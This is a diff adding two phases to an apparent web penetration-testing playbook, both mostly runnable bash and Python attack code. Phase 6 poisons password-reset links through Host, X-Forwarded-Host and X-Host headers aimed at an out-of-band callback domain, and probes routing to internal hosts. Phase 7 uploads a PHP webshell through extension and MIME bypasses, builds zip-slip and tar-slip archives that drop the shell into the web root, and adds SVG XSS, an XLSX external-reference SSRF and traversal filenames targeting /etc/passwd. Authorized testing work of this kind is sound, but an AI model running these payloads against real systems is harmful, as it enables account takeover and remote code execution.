@@ -548,12 +548,299 @@ done
 
 ---
 
-## Phase 6 — Save Results & Update Engagement
+## Phase 6 — Host Header Attacks
+
+**Why it matters**: Password reset poisoning via Host header is a standalone High-severity finding completely separate from cache poisoning. The app uses the Host header to construct the password reset link — inject your domain → victim receives reset email with your URL → you capture their token.
+
+**Signal**: Any password reset / account recovery flow. Any app using `$_SERVER['HTTP_HOST']`, `request.host`, or framework `url_for` without explicitly configured base URL.
+
+```bash
+TARGET_URL=<full_url_with_scheme>
+DOMAIN=$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1)
+ENG=/home/kali/current
+OAST="<your_oast_domain>"  # from interactsh; check callbacks after running
+
+echo "=== Phase 6: Host Header Attacks ==="
+echo ""
+
+echo "--- Password Reset Poisoning ---"
+echo "[*] Testing Host header injection on password reset endpoints..."
+
+for reset_path in \
+    /api/password-reset \
+    /api/forgot-password \
+    /api/auth/reset \
+    /api/v1/password-reset \
+    /api/account/forgot-password \
+    /forgot-password \
+    /reset-password \
+    /auth/forgot; do
+
+    # Method 1: Direct Host header injection
+    CODE=$(curl -sk -X POST "$TARGET_URL$reset_path" \
+        -H "Host: $OAST" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"victim@target.com"}' \
+        -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && \
+        echo "  [Host: $OAST] $reset_path → HTTP $CODE"
+
+    # Method 2: X-Forwarded-Host injection (proxy forwards this)
+    CODE=$(curl -sk -X POST "$TARGET_URL$reset_path" \
+        -H "X-Forwarded-Host: $OAST" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"victim@target.com"}' \
+        -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && \
+        echo "  [X-Forwarded-Host: $OAST] $reset_path → HTTP $CODE"
+
+    # Method 3: X-Host header (less common but used by some frameworks)
+    CODE=$(curl -sk -X POST "$TARGET_URL$reset_path" \
+        -H "X-Host: $OAST" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"victim@target.com"}' \
+        -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && \
+        echo "  [X-Host: $OAST] $reset_path → HTTP $CODE"
+done
+
+echo ""
+echo "After sending: check OAST callbacks for incoming connection from target mail server"
+echo "(mail server fetching the 'validate' link = server parsed our injected host)"
+echo ""
+
+echo "--- Host Header Routing to Internal Services ---"
+# Some load balancers route by Host header to internal vhosts
+echo "[*] Testing Host header routing bypass..."
+for internal_host in \
+    "localhost" \
+    "127.0.0.1" \
+    "internal.${DOMAIN}" \
+    "admin.${DOMAIN}" \
+    "backend.${DOMAIN}" \
+    "api-internal.${DOMAIN}" \
+    "staging.${DOMAIN}"; do
+
+    RESP=$(curl -sk -H "Host: $internal_host" "$TARGET_URL" \
+        --max-time 5 -o /tmp/host_routing.txt -w "%{http_code}" 2>/dev/null)
+    BODY=$(head -c 200 /tmp/host_routing.txt)
+    echo "  Host: $internal_host → HTTP $RESP"
+    echo "$BODY" | grep -qi "admin\|internal\|staging\|debug\|config\|management" && \
+        echo "    [!] Response contains privileged keywords — possible routing bypass!"
+done
+
+echo ""
+echo "--- Host Header Ambiguity (dual Host headers) ---"
+# Some servers parse the first Host, some parse the last
+curl -sk -D - "$TARGET_URL" \
+    -H "Host: $DOMAIN" \
+    -H "Host: $OAST" \
+    -o /dev/null --max-time 5 2>/dev/null | head -10
+```
+
+**Impact gate**: OAST callback received from mail server → password reset poisoning confirmed → **High** (CVSS 8.0: AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N). Routing bypass to internal service → severity depends on what's exposed.
+
+---
+
+## Phase 7 — File Upload Deep Testing
+
+**Why it matters**: File upload is one of the most impactful attack surfaces — it can lead to RCE (webshell), SSRF (Office docs), XSS (SVG), and path traversal (zip slip). Most apps have multiple upload endpoints with different protections.
+
+**Signal**: Any file upload, profile picture, document upload, avatar, attachment, import CSV/JSON/XML, thumbnail generation.
+
+```bash
+TARGET_URL=<full_url_with_scheme>
+TOKEN=<auth_token>
+ENG=/home/kali/current
+OAST="<your_oast_domain>"
+mkdir -p "$ENG/poc/uploads"
+
+echo "=== Phase 7: File Upload Deep Testing ==="
+
+# Discover upload endpoints
+echo "--- Upload endpoint discovery ---"
+for path in \
+    /api/upload /api/file/upload /api/v1/upload /api/avatar \
+    /api/profile/photo /api/attachment /api/import \
+    /api/documents /api/files /api/media \
+    /upload /profile/picture /avatar; do
+    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
+        -H "Authorization: Bearer $TOKEN" \
+        "$TARGET_URL$path" --max-time 5 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] $path"
+done
+```
+
+```bash
+TARGET_URL=<base_url>
+TOKEN=<auth_token>
+UPLOAD_ENDPOINT=<discovered_upload_path>  # e.g. /api/upload
+ENG=/home/kali/current
+OAST=<oast_domain>
+
+echo "=== Phase 7b: SVG XSS ==="
+# SVG is XML — can contain <script> tags, event handlers, external references
+cat > /tmp/xss.svg << 'SVGEOF'
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script type="text/javascript">alert(document.domain)</script>
+  <image href="http://<OAST_DOMAIN>/svg-ssrf" width="100" height="100"/>
+</svg>
+SVGEOF
+sed -i "s/<OAST_DOMAIN>/$OAST/g" /tmp/xss.svg
+
+curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+    -H "Authorization: Bearer $TOKEN" \
+    -F "file=@/tmp/xss.svg;type=image/svg+xml" \
+    2>/dev/null | head -10
+
+echo ""
+echo "=== Phase 7c: Extension Bypass (webshell upload) ==="
+cat > /tmp/test.php << 'PHPEOF'
+<?php echo shell_exec($_GET['cmd']); ?>
+PHPEOF
+cat > /tmp/test.phtml << 'PHPEOF'
+<?php echo shell_exec($_GET['cmd']); ?>
+PHPEOF
+
+for ext in \
+    "php" "PHP" "php3" "php4" "php5" "php7" "phtml" "pHp" \
+    "php.jpg" "php%00.jpg" "php;.jpg" \
+    ".php." "php " "php#" \
+    "jsp" "jspx" "asp" "aspx" "shtml" "shtm"; do
+    CODE=$(curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+        -H "Authorization: Bearer $TOKEN" \
+        -F "file=@/tmp/test.php;filename=shell.$ext" \
+        -o /dev/null -w "%{http_code}" 2>/dev/null)
+    [ "$CODE" != "400" ] && [ "$CODE" != "422" ] && \
+        echo "  [HTTP $CODE] shell.$ext — potentially accepted!"
+done
+
+echo ""
+echo "=== Phase 7d: MIME Type Bypass ==="
+for mimetype in \
+    "image/jpeg" "image/png" "image/gif" "application/octet-stream" \
+    "text/plain" "image/svg+xml" "application/pdf"; do
+    CODE=$(curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+        -H "Authorization: Bearer $TOKEN" \
+        -F "file=@/tmp/test.php;type=$mimetype;filename=shell.php" \
+        -o /dev/null -w "%{http_code}" 2>/dev/null)
+    echo "  Content-Type: $mimetype → HTTP $CODE"
+done
+
+echo ""
+echo "=== Phase 7e: ZIP Slip Attack ==="
+# Create zip with path traversal in filename → extracts outside web root
+python3 - << 'PYEOF'
+import zipfile, os
+
+payload = b'<?php echo shell_exec($_GET["cmd"]); ?>'
+OAST = "<oast_domain>"
+
+# Create malicious zip with path traversal
+with zipfile.ZipFile('/tmp/zipslip.zip', 'w') as z:
+    z.writestr('../../../var/www/html/shell.php', payload)
+    z.writestr('../../tmp/shell.php', payload)
+    z.writestr('shell.php', payload)  # benign-looking entry
+
+print("[*] Created /tmp/zipslip.zip with traversal paths")
+print("  Extract would write to: /var/www/html/shell.php (if vulnerable)")
+
+# Also create tar slip
+import tarfile, io
+with tarfile.open('/tmp/tarslip.tar.gz', 'w:gz') as t:
+    info = tarfile.TarInfo(name='../../../var/www/html/shell.php')
+    info.size = len(payload)
+    t.addfile(info, io.BytesIO(payload))
+print("[*] Created /tmp/tarslip.tar.gz with path traversal")
+PYEOF
+
+# Upload the zip/tar
+for archive in /tmp/zipslip.zip /tmp/tarslip.tar.gz; do
+    CODE=$(curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+        -H "Authorization: Bearer $TOKEN" \
+        -F "file=@$archive" \
+        -o /dev/null -w "%{http_code}" 2>/dev/null)
+    echo "  Uploaded $archive → HTTP $CODE"
+    echo "  (if 200: check if /shell.php is accessible at web root)"
+done
+
+echo ""
+echo "=== Phase 7f: Excel/Word SSRF (Server-Side Preview) ==="
+# Create XLSX with external reference — triggers SSRF when server generates preview
+python3 - << 'PYEOF'
+import zipfile, os
+
+OAST = "<oast_domain>"
+
+# XLSX is a ZIP with XML files — inject external reference
+xlsx_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+</Types>'''
+
+xlsx_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
+    Target="xl/workbook.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
+    Target="http://{OAST}/xlsx-ssrf" TargetMode="External"/>
+</Relationships>'''
+
+with zipfile.ZipFile('/tmp/ssrf.xlsx', 'w') as z:
+    z.writestr('[Content_Types].xml', xlsx_types)
+    z.writestr('_rels/.rels', xlsx_rels)
+    z.writestr('xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"></workbook>')
+
+print(f"[*] Created /tmp/ssrf.xlsx with external reference to http://{OAST}/xlsx-ssrf")
+print("    Upload to any 'import spreadsheet', 'upload Excel', or 'preview document' feature")
+PYEOF
+
+CODE=$(curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+    -H "Authorization: Bearer $TOKEN" \
+    -F "file=@/tmp/ssrf.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
+    -o /dev/null -w "%{http_code}" 2>/dev/null)
+echo "  XLSX SSRF upload → HTTP $CODE | check OAST for callback"
+
+echo ""
+echo "=== Phase 7g: Path Traversal in Filename ==="
+for fname in \
+    "../../../etc/passwd" \
+    "..%2F..%2F..%2Fetc%2Fpasswd" \
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
+    "....//....//etc/passwd" \
+    "shell.php%00.jpg" \
+    "shell.php\x00.jpg" \
+    "../webroot/shell.php" \
+    "/etc/passwd"; do
+    CODE=$(curl -sk -X POST "$TARGET_URL$UPLOAD_ENDPOINT" \
+        -H "Authorization: Bearer $TOKEN" \
+        -F "file=@/tmp/test.php;filename=$fname" \
+        -o /tmp/upload_path_resp.txt -w "%{http_code}" 2>/dev/null)
+    LOCATION=$(cat /tmp/upload_path_resp.txt 2>/dev/null | python3 -c \
+        "import json,sys; d=json.load(sys.stdin); print(d.get('url',d.get('path','')))" 2>/dev/null)
+    echo "  filename=$fname → HTTP $CODE | path=$LOCATION"
+done
+```
+
+**Impact gate**:
+- SVG XSS confirmed → **Medium** (requires victim to view file URL)
+- PHP/JSP execution → **Critical** (RCE via webshell)
+- ZIP slip to web root → **Critical** (RCE)
+- Excel SSRF → **High** (SSRF to internal network from server)
+- Path traversal in stored filename → **High** (write to arbitrary location)
+
+---
+
+## Phase 8 — Save Results & Update Engagement
 
 ```bash
 ENG=/home/kali/current
 
-echo "=== pt-web: Results Summary ==="
+echo "=== pt-web: Results Summary (Phases 1-7) ==="
 echo ""
 echo "Smuggling:"
 [ -f "$ENG/scans/web/smuggler.txt" ] && grep -iE "issue|vulnerable|CLTE|TECL" "$ENG/scans/web/smuggler.txt" | head -5 || echo "  No results"
